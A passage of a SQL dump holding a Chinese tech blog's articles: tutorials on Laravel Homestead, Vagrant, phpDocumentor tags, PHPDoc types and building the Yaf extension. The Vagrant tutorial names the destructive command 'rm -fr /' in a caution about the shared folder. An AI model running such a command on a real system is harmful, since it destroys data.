Wiki,&nbsp;<a href="https://wiki.debian.org/DotFiles" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Dot Files</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[3] Debian Administration,&nbsp;<a href="http://www.debian-administration.org/articles/212" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">An introduction to run-levels</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[4] Debian Admin，<a href="http://www.debianadmin.com/debian-and-ubuntu-linux-run-levels.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Debian and Ubuntu Linux Run Levels</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[5] Linux Information Project (LINFO),&nbsp;<a href="http://www.linfo.org/runlevel_def.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Runlevel Definition</a></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline;">[6] LinuxQuestions.org,&nbsp;<a href="http://wiki.linuxquestions.org/wiki/Run_Levels" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">What are run levels?</a></p><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">[7] Dalton Hubble,&nbsp;<a href="http://dghubble.com/.bashprofile-.profile-and-.bashrc-conventions.html" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">Bash Configurations Demystified</a></p></blockquote><p><br/></p><p>原文：http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html</p>', '半年前，我写了《计算机是如何启动的？》，探讨BIOS和主引导记录的作用。\r\n那篇文章不涉及操作系统，只与主板的板载程序有关。今天，我想接着往下写，探讨操作系统接管硬件以后发生的事情，也就是操作系统的启动流程。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/ebf259fccd1e58e667fe12dc3f11b1ab.png', 'mylxsw', '转载', 1, 0, 1408066765, NULL, NULL, 'html');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(372, 'Laravel之Homestead虚拟开发环境', '# Laravel Homestead\r\n\r\n- [简介](#introduction)\r\n- [包含的软件](#included-software)\r\n- [安装 & 启动](#installation-and-setup)\r\n- [每日技巧](#daily-usage)\r\n- [端口列表](#ports)\r\n\r\n<a name="introduction"></a>\r\n## 简介\r\n\r\nLaravel极力去使得PHP开发体验变得更加令人愉快，包括开发环境的搭建过程。[Vagrant](http://vagrantup.com) 提供了一个简单的，快捷的方法来管理开发环境虚拟机。   \r\n\r\nLaravel Homestead是一个离线的，预先打好包的Vagrant "box"，它提供了一个很棒的开发环境，你不需要在你自己的计算机上安装PHP，web服务器和任何的其它服务器软件，不用再担心误操作弄坏你的系统！Vagrant的box是完全可以重新创建的，一旦出现了什么错误，你可以销毁它并重新创建一个。   \r\n\r\n\r\nHomestead可以在Windows， Mac和Linux上运行，它包含了PHP5.5, Nginx服务器，MySQL,Postgres, Redis, Memcached和其它所有在开发Laravel应用需要的软件。   \r\n\r\nHomestead目前版本的是在Vagrant 1.6上构建和测试的。\r\n\r\n<a name="included-software"></a>\r\n## 包含的软件\r\n\r\n- Ubuntu 14.04\r\n- PHP 5.5\r\n- Nginx\r\n- MySQL\r\n- Postgres\r\n- Node (With Bower, Grunt, and Gulp)\r\n- Redis\r\n- Memcached\r\n- Beanstalkd\r\n- [Laravel Envoy](/docs/ssh#envoy-task-runner)\r\n- Fabric + HipChat Extension\r\n\r\n<a name="installation-and-setup"></a>\r\n## 安装 & 启动\r\n\r\n### 安装VirtualBox 和Vagrant\r\n\r\n在启动Homestead环境之前，你必须安装[VirtualBox](https://www.virtualbox.org/wiki/Downloads) 和[Vagrant](http://www.vagrantup.com/downloads.html)。这两个软件都对流行操作系统提供了非常简单的图形化安装器。\r\n\r\n### 添加Vagrant盒子\r\n\r\n一旦安装玩VirtualBox和Vagrant，你应该接下来使用下列命令添加`laravel/homestead` 盒子到你的Vagrant上。这将会根据你的网络速度花费几分钟下载这个box。\r\n\r\n	vagrant box add laravel/homestead\r\n\r\n### 克隆Homestead仓库\r\n\r\n当将盒子添加到Vagrant上之后，你应该接下来克隆或者下载这个仓库。考虑克隆这个仓库到你存放你所有的Laravel工程的`Homestead`目录中，Homestead盒子将会为所有的这些Larabel（和PHP）工程提供服务。\r\n	\r\n	git clone https://github.com/laravel/homestead.git Homestead\r\n\r\n### 设置你的SSH密钥\r\n\r\n接下来，你应该编辑在仓库中的`Homestead.yaml`文件。在这个文件中，你可以配置你的公钥的路径，同时也可以配置你希望你的机器与Homestead虚拟机共享的目录。\r\n\r\n你没有SSH密钥？ 在Mac和Linux系统上，你可以通过使用下列命令创建你的SSH密钥：\r\n\r\n	ssh-keygen -t rsa -C "your@email.com"\r\n\r\n在Windows上，你可以安装[Git](http://git-scm.com/)，并且使用 `Git Bash` shell 命令创建。当然，你也可以使用[PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html) 和 [PuTTYgen](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html).\r\n\r\n当你创建好你的SSH密钥之后，在`Homestead.yaml`文件中的`authorize`属性指定密钥的路径。\r\n\r\n### 配置你的共享文件夹\r\n\r\n在`Homestead.yaml`文件中的`folders`属性中列出了所有你希望与你的主机环境共享的文件夹。如果在这个文件夹中的文件被修改了，它将会在你的计算机和Homestead虚拟机中自动的进行同步。你可以通过配置设置多个你希望共享的文件夹！\r\n\r\n### 配置你的Nginx站点\r\n\r\n对Nginx不熟悉？没问题！ `sites`属性允许你可以非常轻松的映射一个域名到你在Homestead环境中的文件夹。一个简单的站点的配置包含在了`Homestead.yaml`文件中。另外，你可以在你的Homestead环境中根据你的需要添加多个站点。Homestead可以方便的作为你每一个Laravel项目的虚拟环境。\r\n\r\n### Bash别名\r\n\r\n要给你的Homestead盒子添加Bash别名的话，只需要简单的添加到在Homestead目录下的`aliases`文件就可以了。\r\n\r\n### 启动Vagrant盒子\r\n\r\n当你按照你的喜好编辑`Homestead.yaml文件之后，在控制台中从Homestead目录运行`vagrant up`命令，Vagrant将会启动虚拟机，并且自动的配置你的共享目录和Nginx站点。\r\n\r\n不要忘记将Nginx站点的域名假如到你的机器的`hosts`文件中！在Mac和Linux上，这个文件位于`/etc/hosts`,在Windows下，位于`C:\\Windows\\System32\\drivers\\etc/hosts`。在这个文件中加入你的host配置，如下面所示：\r\n	\r\n	127.0.0.1  homestead.app\r\n	\r\n当你添加域名到`hosts`文件中后，你可以在浏览器中使用该域名访问服务器了！\r\n\r\n	http://homestead.app:8000\r\n	\r\n学习如何连接到数据库，请继续阅读！\r\n\r\n<a name="daily-usage"></a>\r\n## 每日技巧\r\n### 使用SSH连接\r\n\r\n要通过SSH连接到你的Homestead环境，你应该使用在`Homestead.yaml`文件中指定的SSH密钥连接`127.0.0.1`的2222端口。你也可以在`Homestead`目录中简单的执行`vagrant ssh`命令。\r\n\r\n如果你希望更加方便的话，可以添加如下命令别名到`~/.bash_aliases`或者是`~/.bash_profile`文件中。\r\n\r\n	alias vm=''ssh vagrant@127.0.0.1 -p 2222''\r\n\r\n### 连接到你的数据库\r\n\r\n在`homestead`中，已经配置了MySQL和Postgres数据库可以直接使用。为了更加方便的访问，Laravel的`local`数据库配置用于配置默认使用哪个数据库。\r\n\r\n如果希望在你的计算机上通过Navicat或者Sequel Pro连接你的MySQL或者Postgres数据库的话，你应该连接`127.0.0.1`和端口33060（MYSQL）或者54320（Postgres）。两个数据库的用户名和密码都是`homestead`/`secret`。\r\n\r\n> **注意:** 你应该总是使用这些非标准端口从你的主机上连接数据库，而在你的Laravel项目的数据库配置中，使用默认的3306和5432端口，因为Laravel将会运行在虚拟机之中。\r\n\r\n### 添加其它站点\r\n\r\n一旦你的Homestead环境已经配置好了并且可以运行了，你可能希望添加额外的Nginx站点。你可以运行多个Laravel项目在单个Homestead环境中。有两种方式可以完成这个需求： 首先，你可以简单的添加站点到`Homestead.yaml`文件中，并且运行`vagrant provision`命令。\r\n\r\n另外，你可以使用`serve`脚本。要使用`serve`脚本，SSH登陆到你的Homestead环境中，并且运行下面的命令：\r\n\r\n	serve domain.app /home/vagrant/Code/path/to/public/directory\r\n\r\n> **注意:** 在运行`serve`命令之后，不要忘记添加站点到你的`hosts`文件中！\r\n\r\n<a name="ports"></a>\r\n## 端口列表\r\n\r\n下列的端口为到你的Homestead环境的映射关系：\r\n\r\n- **SSH:** 2222 -> Forwards To 22\r\n- **HTTP:** 8000 -> Forwards To 80\r\n- **MySQL:** 33060 -> Forwards To 3306\r\n- **Postgres:** 54320 -> Forwards To 5432\r\n', 'Laravel Homestead是一个离线的，预先打好包的Vagrant "box"，它提供了一个很棒的开发环境，你不需要在你自己的计算机上安装PHP，web服务器和任何的其它服务器软件', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/34009fe662068635b5f92f26b14cef6d.jpg', 'mylxsw', '翻译', 1, 0, 1408286153, 1408292824, 0, 'markdown'),
(373, 'phpDocumentor入门', '### 概述\r\n\r\n本文的目的是向你介绍使用`phpDocumentor`书写并且生成高效的文档。\r\n\r\n### 写一个个文档块（DocBlock）\r\n\r\n文档块是源代码中的一行文档注释，用于告诉你它所标识的类、方法或者是其它结构化的元素的作用是什么。\r\n\r\n### 哪些元素可以被文档化\r\n\r\n在讨论DocBlock之前，让我们先看看你可以为哪些元素创建文档。`phpDocumentor`遵循了PHPDOC规范，能够识别下列结构化元素：\r\n\r\n- Function 函数\r\n- Constant 常量\r\n- Class 类\r\n- Interface 接口\r\n- Trait\r\n- Class constant 类常量\r\n- Property 属性\r\n- Method 方法\r\n\r\n除了上面这些，PHPDoc标准也支持对文件的DocBlock和include/require块。\r\n\r\n在上面这些元素的前面，都可以有一个文档块标识它们，但是注意的是，在文档块和代码定义之间不可以有其它代码或者注释。\r\n\r\n### 文档块是什么\r\n\r\n文档块总是放在/**和 \\*/之间，在之间的每一行内容都应该以\\*开头。每个文档块都放在它关联的元素定义之前。\r\n\r\n例如：\r\n<pre>\r\n&lt;?php\r\n/**\r\n * This is a DocBlock.\r\n */\r\nfunction associatedFunction()\r\n{\r\n}\r\n</pre>\r\n\r\n> ####文件级别的代码块\r\n> 通常有很多项目希望在整个文件上标注它使用的license或者是函数，而不是在单个元素上做。可以通过在文件的第一个元素上面进行标注实现这个功能。需要注意的是，接下来的其它的代码块将不会再被作为文件级别的代码块了。   \r\n> 下面的文档块是文件级别的代码块：\r\n<pre>\r\n&lt;?php\r\n/**\r\n * 属于文件的块\r\n */ \r\n/**\r\n * 属于类的注释\r\n */\r\nclass Def\r\n{\r\n}\r\n</pre>\r\n\r\n> 然而，下面的例子中的文档块属于下面的类：\r\n\r\n    <?php\r\n    /**\r\n     * I belong to a class\r\n     */\r\n     \r\n    class Def\r\n    {\r\n    }\r\n\r\n文档块被分为三部分。\r\n\r\n- 总结部分\r\n	有时候也被成为是短描述，它提供了对关联的元素的简单描述。\r\n\r\n- 描述部分\r\n	有时候也叫做长描述，提供更多的描述信息。例如描述函数的实现算法、使用方式或者是描述如何适应整个应用程序的架构等额外的信息。这一部分在标签出现或者是注释部分结束的地方终止。\r\n\r\n- 标签和注解\r\n	提供被描述元素的一些元信息，例如描述方法或者是函数的返回类型。每个标签都以新行中的@开头。\r\n\r\n例子：\r\n<pre>\r\n&lt;?php\r\n /**\r\n  * 这里是总结信息.\r\n  *\r\n  * 描述部分，这部分可以是多行，提供了对元素的详细描述信息\r\n  * 并且提供了对其它一些后台的信息或者是对其它资源的引用\r\n  *\r\n  * @param string $myArgument 参数描述，这个描述也可以\r\n  * 	是多行的\r\n  * @return void\r\n  */\r\n  function myFunction($myArgument)\r\n  {\r\n  }\r\n</pre>\r\n\r\n### 运行phpDocumentor\r\n\r\n在安装phpDocumentor之后，你可以使用命令`phpdoc`生成文档。\r\n\r\n该命令的基本用法是使用选项(-d 文件， -f 文件)指定要操作的文件夹或者文件，并且告诉它你要输出文档的位置（-t）。\r\n<pre>$ phpdoc -d ./src -t ./docs/api</pre>\r\n上述命令将会搜索src目录和它的子目录下的文件，对他们进行分析并生成一个包含文档的站点到你的doc/api目录下。如果你忽略-t选项的话，默认将会输出到当前路径下的output目录下。\r\n\r\n> phpDocumentor支持多种不同的主题，可以协助你生成不同样式的文档。\r\n\r\n', '本文的目的是向你介绍使用phpDocumentor书写并且生成高效的文档', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/0160b93312e02cc560c9da4bf9218a58.jpeg', 'mylxsw', '翻译', 1, 0, 1408375131, 1413944031, 0, 'markdown'),
(376, 'PHPDoc支持的变量类型', '#####下面是PHPDOC的基本数据类型列表：\r\n\r\n- **string**\r\n\r\n	A piece of text of an unspecified length.\r\n\r\n- **int or integer**\r\n\r\n	A whole number that may be either positive or negative.\r\n\r\n- **float**\r\n\r\n	A real, or decimal, number that may be either positive or negative.\r\n\r\n- **bool or boolean**\r\n\r\n	A variable that can only contain the state ‘true’ or ‘false’.\r\n\r\n- **array**\r\n\r\n	A collection of variables of unknown type. It is possible to specify the types of array members, see the chapter on arrays for more information.\r\n\r\n- **resource**\r\n\r\n	A file handler or other system resource as described in the PHP manual.\r\n\r\n- **null**\r\n\r\n	The value contained, or returned, is literally null. This type is not to be confused with void, which is the total absence of a variable or value (usually used with the @return tag).\r\n\r\n- **callable**\r\n\r\n	A function or method that can be passed by a variable, see the PHP manual for more information on callables.\r\n\r\n#####PHPDoc也支持一些非PHP本地的，但是却经常会被使用的数据类型\r\n\r\n- **mixed**\r\n\r\n	A value with this type can be literally anything; the author of the documentation is unable to predict which type it will be.\r\n\r\n- **void**\r\n\r\n	This is not the value that you are looking for. The tag associated with this type does not intentionally return anything. Anything returned by the associated element is incidental and not to be relied on.\r\n\r\n- **object**\r\n\r\n	An object of any class is returned,\r\n\r\n- **false or true**\r\n\r\n	An explicit boolean value is returned; usually used when a method returns ‘false’ or something of consequence.\r\n\r\n- **self**\r\n\r\n	An object of the class where this type was used, if inherited it will still represent the class where it was originally defined.\r\n\r\n- **static**\r\n\r\n	An object of the class where this value was consumed, if inherited it will represent the child class. (对应PHP的静态延迟绑定).\r\n\r\n- **$this**\r\n\r\n	This exact object instance, usually used to denote a fluent interface.', '本文列出了PHPDoc规范所支持的变量类型。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/7681eb707383aeb28645f0f82d4f9828.png', 'mylxsw', '原创', 1, 0, 1408416653, 1413944116, 0, 'markdown'),
(375, 'Annotations in PHP: They Exist', '<p><iframe src="//www.slideshare.net/slideshow/embed_code/16176893" width="800" height="700" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen=""> </iframe></p><p><strong> <a href="https://www.slideshare.net/rdohms/annotations-in-php-they-exist" title="Annotations in PHP: They Exist" target="_blank">Annotations in PHP: They Exist</a> </strong> from <strong><a href="http://www.slideshare.net/rdohms" target="_blank">Rafael Dohms</a></strong></p><p><br/></p><p>国内网络在2012年将slideshare屏蔽，因此该幻灯片（共138页）需要翻墙查看，可以使用 GoAgent 翻墙后查看。</p>', '注解并不仅仅是phpdoc注释，它们可以为你的代码提供更多的信息，实现更加丰富的功能，虽然该功能现在被拒绝加入到PHP核心，但是我们不能忽视该功能所提供的便利。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/ab79e6cc895fea87ef8a8b4ffd63e8c2.jpg', 'mylxsw', '分享', 1, 0, 1408377569, 1408377707, 0, 'html'),
(377, 'Vagrant快速入门', 'Vagrant是一个基于Ruby的工具，用于创建和部署虚拟化开发环境。它 使用Oracle的开源VirtualBox虚拟化系统，使用 Chef创建自动化虚拟环境。\r\n\r\n#### 1.1 项目初始化\r\n\r\nVagrant使用`Vagrant`文件作为配置文件，该文件中定义了项目的根目录，Vagrant的很多配置都是基于这个配置的根目录进行的，同时，该文件也描述了项目运行所需要的机器类型以及其它资源（比如安装哪些软件等）。\r\n\r\n要初始化一个Vagrant项目，使用命令`vagrant init`命令，使用该命令后，会在当前目录创建一个名为`Vagrantfile`的配置文件，修改该文件改变Vagrant项目的行为。\r\n\r\n```shell\r\n$ mkdir vagrant_getting_started\r\n$ cd vagrant_getting_started\r\n$ vagrant init\r\n```\r\n\r\nVagrant使用盒子（box）创建开发环境，所谓的盒子就是一个已经配置好的基础的虚拟机镜像，Vagrant避免了每次创建项目都去重新创建虚拟机，而是按照`Vagrantfile`文件的配置从基础镜像创建这个Box。\r\n\r\n> 可以在已经存在的项目上使用`vagrant init`命令，该命令只会创建配置文件，并不会对原有项目造成影响。如果需要，可以将该配置文件`Vagrantfile`加入到项目的版本控制中，这样团队中的其它开发者就可以快速的建立起开发环境已进行运行调试了。\r\n\r\n在创建Vagrant项目的时候，首先需要做的是添加一个Box，通过使用命令`vagrant box add`添加一个盒子,Vagrant网站上提供了很多其它开发者共享的Box，我们可以直接复用，在[Vagrant Cloud](https://vagrantcloud.com/)上可以查找你需要的Box并且添加到本地。\r\n\r\n```shell\r\n$ vagrant box add chef/centos-6.5\r\n```\r\n\r\n添加的盒子是可以被多个项目同时使用的，项目在初始化Box的时候并不会修改添加的基础Box，而是克隆一份Box的副本，在副本上进行配置。\r\n\r\n添加盒子之后，我们需要配置项目使用这个盒子作为基础，修改`Vagrantfile`文件：\r\n\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  config.vm.box = "chef/centos-6.5"\r\nend\r\n```\r\n> 注意: 如果这里指定的box没有添加过，则Vagrant会自动去下载该Box。\r\n\r\n####1.2 启动并运行项目\r\n在配置完成后，就可以启动该虚拟环境了，使用命令`vagrant up`启动开发环境。\r\n\r\n```shell\r\n$ vagrant up\r\n```\r\n\r\n启动之后，我们可以使用ssh连接到该虚拟机上：\r\n\r\n```shell\r\n$ vagrant ssh\r\n```\r\n\r\n现在你已经连接到该虚拟机上了，你可以像操作普通Linux系统一样做你希望做的事情。\r\n\r\n> 注意的是，在该虚拟机上进行`rm -fr /`操作的时候请谨慎一些，因为在该虚拟机中，挂载了`/vagrant`目录，该目录是与你主机的项目共享的，删除的话会将项目删除掉。\r\n\r\n在该虚拟机使用完成后，如果不再需要了，可以使用`vagrant destroy`命令移除该虚拟机。\r\n\r\n> 提示： 默认配置下，虚拟机中的`/vagrant`目录与主机上的项目目录是同一个目录，该目录中的所有操作都会自动同步。\r\n\r\n####1.3 创建项目初始化脚本\r\n每次初始化系统的时候都需要重新安装软件是一件非常麻烦的事，因此，Vagrant提供了一种简单的方式来帮我们完成这个过程，在建立虚拟机的时候可以指定自动执行脚本。\r\n\r\n在项目目录下创建一个bootstrap.sh的脚本文件：\r\n```shell\r\n#!/usr/bin/env bash\r\n\r\napt-get update\r\napt-get install -y apache2\r\nrm -rf /var/www\r\nln -fs /vagrant /var/www\r\n```\r\n\r\n该脚本是在Ubuntu环境下使用的，如果你是用的Box是CentOS，则不能使用`apt-get`命令了，而应该使用`yum`命令完成程序的安装。\r\n\r\n接下来，我们需要配置`Vagrantfile`文件，让其在建立环境的时候自动执行该脚本。\r\n```shell\r\nVagrant.configure("2") do |config|\r\n  config.vm.box = "hashicorp/precise32"\r\n  config.vm.provision :shell, path: "bootstrap.sh"\r\nend\r\n```\r\n\r\n这样配置之后，使用命令`vagrant up`启动虚拟机的时候，该脚本就会自动执行，完成虚拟机的初始化了。\r\n\r\n> 如果你的虚拟机已经处于运行状态了，可以通过使用命令`vagrant reload --provision`快速的重新启动虚拟机，命令中的`--provision`告诉Vagrant在重启的时候运行provisioners的配置，通常情况下，provisioners的配置只在执行`vagrant up`命令的时候才会执行。\r\n\r\n####1.4 网络配置\r\nVagrant提供了端口转发功能，通过将虚拟机中的端口映射到主机的不同端口，我们可以在主机中使用映射后的端口访问虚拟机中的服务。\r\n\r\n例如：\r\n```ruby\r\nVagrant.configure("2") do |config|\r\n  config.vm.box = "hashicorp/precise32"\r\n  config.vm.provision :shell, path: "bootstrap.sh"\r\n  config.vm.network :forwarded_port, host: 4567, guest: 80\r\nend\r\n```\r\n使用如上配置启动虚拟机之后，就可以在主机上使用`http://127.0.0.1:4567`访问虚拟机上的Apache提供的Web服务了。\r\n\r\n\r\n####1.5 Teardown(虚拟机卸载)\r\n当你希望切换到其它项目上开发或者是当你要出去吃午饭，你下班了的情况下，你需要清理一下你的开发环境，这个时候，Vagrant提供了三种方式，它们各有各自的优缺点，因此，你需要自己去权衡你希望采用哪种方式。\r\n\r\n- Suspending （挂起）\r\n	执行命令`vagrant suspend`将会保存当前虚拟机的运行状态并且停止它，跟主机挂起是一样的，当你需要再次启动的时候，使用`vagrant up`命令将会恢复之前的运行状态。这种方式的优点是，启动很迅速，可以很快进入开发环境中，缺点是会占用比较多的磁盘空间，因为虚拟机将内存中的数据都存储到了磁盘上。\r\n\r\n- Halting（停止）\r\n	这种方式是正常的停止虚拟机，使用虚拟机的关闭命令完成，当需要重新使用的时候使用命令`vagrant up`重新启动虚拟机，该方法与计算机冷启动一样，缺点是启动的时候耗时比较多，依然占用部分磁盘空间。\r\n\r\n- Destroying（销毁）\r\n	该方式将会销毁虚拟机，不会再占用磁盘空间，下次启动的时候将会重新建立开发环境，包括下载软件等等。\r\n', 'Vagrant是一个基于Ruby的工具，用于创建和部署虚拟化开发环境。它 使用Oracle的开源VirtualBox虚拟化系统，使用 Chef创建自动化虚拟环境。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/81b2bd06ba23e247f9c2a0bfda36c047.jpg', 'mylxsw', '原创', 1, 0, 1408547691, NULL, NULL, 'markdown'),
(381, 'Cent OS安装PHP-Yaf扩展', '项目用到了yaf框架，因此需要在Cent OS服务器上安装php的yaf扩展，但是苦于服务器没有安装pecl，因此安装过程比较曲折，不过，讲过不断的折腾，终于安装成功了。\r\n\r\n首先，发现服务器没有安装`pecl`，找到的教程都是如何使用pecl安装扩展的，但是却很少关于如何安装pecl的，可能是因为在安装配置php环境的时候大家都自动安装pecl了吧，不过我们的服务器上却没有，因此，需要先安装pecl。\r\n\r\n```shell\r\n$ sudo yum install php-pear\r\n```\r\n\r\n安装好pecl之后，就可以安装yaf扩展了。\r\n\r\n```shell\r\n$ sudo pecl install yaf\r\n```\r\n本来期望的是会顺利完成安装的，但是服务器配置了多个php环境，因此，出现错误提示需要在`./configure`的时候提供`--with-php-config=PATH`参数，这样就没法通过pecl安装了，因此只能手动编译了。\r\n\r\n```shell\r\n$ pecl download yaf\r\n$ tar -zxvf yaf-2.2.9.tgz\r\n$ cd yaf-2.2.9\r\n$ phpize\r\n$ ./configure --with-php-config=/usr/local/php/bin/php-config\r\n$ make\r\n$ sudo make install \r\n```\r\n终于安装完成了,使用`php --info`可以查看到扩展的信息。\r\n```shell\r\n$ php --info|grep yaf\r\n```\r\n\r\n\r\n\r\n', '项目用到了yaf框架，因此需要在Cent OS服务器上安装php的yaf扩展，但是苦于服务器没有安装pecl，因此安装过程比较曲折，不过，讲过不断的折腾，终于安装成功了。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '原创', 1, 0, 1408680702, NULL, NULL, 'markdown'),
(382, 'phpDocumentor 常用标签说明', '#### @example\r\n该标签用于指出代码的范例所在的位置，该位置可以为绝对路径或者是相对本文件的相对路径。\r\n```php\r\n@example [location][<start-line>[<number-of-lines>]][<description>]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @example example1.php Counting in action.\r\n  * @example http://example.com/example2.phps Counting in action by a 3rd party.\r\n  * @example "My Own Example.php" My counting.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n> 该标签`@example`可以用于内联，也可以用于非内联。\r\n\r\n#### @internal\r\n该标签指出声明的方法、函数等为项目内部使用的，通常与`@api`一起使用，用于指出标注的结构化元素只在软件的内部使用。\r\n\r\n```php\r\n@internal [description]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @internal\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n如果是内联的话，这样使用:\r\n```php\r\n/**\r\n  * Counts the number of Foo.\r\n  *\r\n  * {@internal Silently adds one extra Foo to compensate for lack of Foo }}\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@inheritdoc\r\n该标签用于子类或者子类中重写的父类方法的注释，引用父类中的注释内容。\r\n例如：\r\n```php\r\nclass A extends B{\r\n	/**\r\n     * 该方法在B类中存在\r\n     *\r\n     * 该方法在B类中存在，这里引用B类中的注释内容{@inheritdoc}\r\n     *\r\n     * @return void\r\n     */\r\n	public function methodA(){}\r\n}\r\n```\r\n\r\n####@link\r\n该标签用于指出当前文档块与`@link`指向的链接内容有一定的关系。\r\n\r\n```php\r\n@link [URI][<description>]\r\n```\r\n\r\n例如：\r\n```php\r\n/**\r\n  * @link http://example.com/my/bar Documentation of Foo.\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n内联用法:\r\n```php\r\n/**\r\n  * This method counts the occurrences of Foo.\r\n  *\r\n  * When no more Foo ({@link http://example.com/my/bar}) are given this\r\n  * function will add one as there must always be one Foo.\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@see\r\n该标签用于引用文档中的其它标签或者是其它的URI。\r\n```php\r\n@see [URI|其它文档元素][<description>]\r\n```\r\n例子：\r\n```php\r\n/**\r\n  * @see http://example.com/my/bar Documentation of Foo.\r\n  * @see MyClass::$items           For the property whose items are counted.\r\n  * @see MyClass::setItems()       To set the items for this collection.\r\n  *\r\n  * @return integer Indicates the number of items.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@api\r\n该标签用于表明声明的元素为向第三方提供的API，被该标签声明的元素应该在日后其使用方法是不变的，除非有新的版本，而且应该保持向后兼容，一般用在框架或者其他对外开放的调用服务中。\r\n```php\r\n@api\r\n```\r\n例子：\r\n```php\r\n/**\r\n  * This method will not change until a major release.\r\n  *\r\n  * @api\r\n  *\r\n  * @return void\r\n  */\r\n  function showVersion()\r\n  {\r\n     <...>\r\n  }\r\n```\r\n\r\n####@author\r\n说明元素的作者。\r\n```php\r\n@author [name][<email address>]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @author My Name\r\n  * @author My Name <my.name@example.com>\r\n  */\r\n```\r\n\r\n####@copyright\r\n用于标识版权信息.\r\n```php\r\n@copyright [description]\r\n```\r\n\r\n例如：\r\n```php\r\n/**\r\n  * @copyright 1997-2005 The PHP Group\r\n  */\r\n```\r\n\r\n####@deprecated\r\n表明元素已经不推荐使用了，在之后将会被移除。\r\n```php\r\n@deprecated [<version>][<description>]\r\n```\r\n\r\n例如：\r\n```php\r\n/**\r\n  * @deprecated\r\n  * @deprecated 1.0.0\r\n  * @deprecated No longer used by internal code and not recommended.\r\n  * @deprecated 1.0.0 No longer used by internal code and not recommended.\r\n  */\r\n function count()\r\n {\r\n     <...>\r\n }\r\n```\r\n\r\n####@filesource\r\n该标签用于在文档中包含文件源码，该标签只能用在文件级别。\r\n\r\n```php\r\n@filesource\r\n```\r\n例如:\r\n```php\r\n/**\r\n  * @filesource\r\n  */\r\n```\r\n\r\n####@ignore\r\n该标签用于告诉phpDocumentor该元素不需要被处理。\r\n```php\r\n@ignore [<description>]\r\n```\r\n例如：\r\n```php\r\nif ($ostest) {\r\n     /**\r\n      * This define will either be ''Unix'' or ''Windows''\r\n      */\r\n     define("OS","Unix");\r\n } else {\r\n     /**\r\n      * @ignore\r\n      */\r\n     define("OS","Windows");\r\n }\r\n```\r\n\r\n####@license\r\n该标签用于指出文档块使用的license。\r\n```php\r\n@license [<url>][name]\r\n```\r\n例如：\r\n```php\r\n/**\r\n  * @license GPL\r\n  * @license http://opensource.org/licenses/gpl-license.php GNU Public License\r\n  